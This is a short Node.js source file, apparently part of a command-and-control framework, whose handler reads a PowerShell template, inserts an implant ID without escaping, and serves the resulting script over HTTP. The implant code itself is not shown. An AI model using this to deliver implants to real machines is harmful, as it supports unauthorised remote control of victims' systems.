//HTTP Demo Channel Component Handler
import fs from 'fs'
import { dirname } from 'path';
import { fileURLToPath } from 'url';
const __dirname = dirname(fileURLToPath(import.meta.url));
console.log(__dirname)
export class ComponentHandler {
  constructor(component) {
    this.component = component
  }
  generateComponent = async function (req, res) {
    let implant_id = this.component.parameters.implant_id
    fs.readFile(__dirname + '/http_channel.ps1', 'utf8',  function(err, code){
      code = code.replace('{{IMP_ID}}', implant_id)
      res.send(code)
    })
  }
}

